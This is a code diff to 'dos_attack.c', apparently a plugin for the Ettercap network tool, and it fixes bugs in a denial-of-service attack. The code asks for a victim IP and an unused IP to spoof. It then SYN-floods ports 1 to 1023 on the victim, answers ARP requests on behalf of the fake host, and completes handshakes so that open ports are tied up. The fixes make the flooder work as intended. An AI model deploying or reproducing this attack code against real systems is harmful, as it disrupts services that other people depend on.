@@ -17,13 +17,16 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Id: dos_attack.c,v 1.2 2004/02/02 16:47:37 lordnaga Exp $
+    $Id: dos_attack.c,v 1.3 2004/02/03 12:19:11 lordnaga Exp $
 */
 
 
 #include <ec.h>                        /* required for global variables */
 #include <ec_plugins.h>                /* required for plugin ops */
+#include <ec_hook.h>
+#include <ec_packet.h>
 #include <ec_send.h>                   
+#include <ec_threads.h>
 
 /* protos */
 int plugin_load(void *);
@@ -40,8 +43,8 @@ struct port_list {
 
 
 /* globals */
-static struct ip_addr *fake_host;
-static struct ip_addr *victim_host;
+static struct ip_addr fake_host;
+static struct ip_addr victim_host;
 SLIST_HEAD(, port_list) port_table;
 
 /* plugin operations */
@@ -93,14 +96,14 @@ static int dos_attack_init(void *dummy)
       INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
       return PLUGIN_FINISHED;
    }
-   ip_addr_init(victim_host, AF_INET, (char *)&ipaddr);
+   ip_addr_init(&victim_host, AF_INET, (char *)&ipaddr);
 
    ui_input("Insert unused IP: ", unused_addr, sizeof(unused_addr));
    if (inet_aton(unused_addr, &ipaddr) == 0) {
       INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
       return PLUGIN_FINISHED;
    }
-   ip_addr_init(fake_host, AF_INET, (char *)&ipaddr);
+   ip_addr_init(&fake_host, AF_INET, (char *)&ipaddr);
 
    INSTANT_USER_MSG("dos_attack: Starting D.O.S. attack against %s [Fake Host: %s]\n", dos_addr, unused_addr);
 
@@ -157,8 +160,8 @@ EC_THREAD_FUNC(syn_flooder)
    struct port_list *p;
  
    /* First "scan" ports from 1 to 1024 */
-   for (dport=1; dport<1024; i++) {
-      send_tcp(fake_host, victim_host, sport++, dport, seq++, 0, TH_SYN);
+   for (dport=1; dport<1024; dport++) {
+      send_tcp(&fake_host, &victim_host, sport++, dport, seq++, 0, TH_SYN);
       usleep(1000);
    }
 
@@ -167,7 +170,7 @@ EC_THREAD_FUNC(syn_flooder)
       CANCELLATION_POINT();
 
       SLIST_FOREACH(p, &port_table, next)    
-         send_tcp(fake_host, victim_host, sport++, p->port, seq++, 0, TH_SYN);
+         send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN);
 	 
       usleep(500);
    }
@@ -176,7 +179,7 @@ EC_THREAD_FUNC(syn_flooder)
 /* Parse the arp packets and reply for the fake host */
 static void parse_arp(struct packet_object *po)
 {
-   if (!ip_addr_cmp(fake_host, &po->L3.dst)) 
+   if (!ip_addr_cmp(&fake_host, &po->L3.dst)) 
       send_arp(ARPOP_REPLY, &po->L3.dst, GBL_IFACE->mac, &po->L3.src, po->L2.src);
 }
 
@@ -189,11 +192,13 @@ static void parse_tcp(struct packet_object *po)
    struct port_list *p;
    
    /* Check if it's a reply to our SYN flooding */
-   if (!ip_addr_cmp(fake_host, &po->L3.dst) &&
-       !ip_addr_cmp(victim_host, &po->L3.src) && 
-       po->L4.flags == (TH_SYN | TH_ACK))  
-      /* Complete the handshake with an ACK */
-      send_tcp(fake_host, victim_host, po->L4.dst, po->L4.src, po->L4.ack, po->L4.seq + 1, TH_ACK);
+   if (ip_addr_cmp(&fake_host, &po->L3.dst) ||
+       ip_addr_cmp(&victim_host, &po->L3.src) || 
+       po->L4.flags != (TH_SYN | TH_ACK))  
+          return;
+	  
+   /* Complete the handshake with an ACK */
+   send_tcp(&fake_host, &victim_host, po->L4.dst, po->L4.src, po->L4.ack, po->L4.seq + 1, TH_ACK);
    
    /* Check if the port is already in the "open" list... */
    SLIST_FOREACH(p, &port_table, next) 
@@ -203,7 +208,7 @@ static void parse_tcp(struct packet_object *po)
    /* If not...put it in */
    SAFE_CALLOC(p, 1, sizeof(struct port_list));
    p->port = po->L4.src;
-   SLIST_INSERT_HEAD(&port_list, p, next);
+   SLIST_INSERT_HEAD(&port_table, p, next);
    
    // XXX - Per test (lo lascio???)
    INSTANT_USER_MSG("dos_attack: Port %d added\n", p->port);
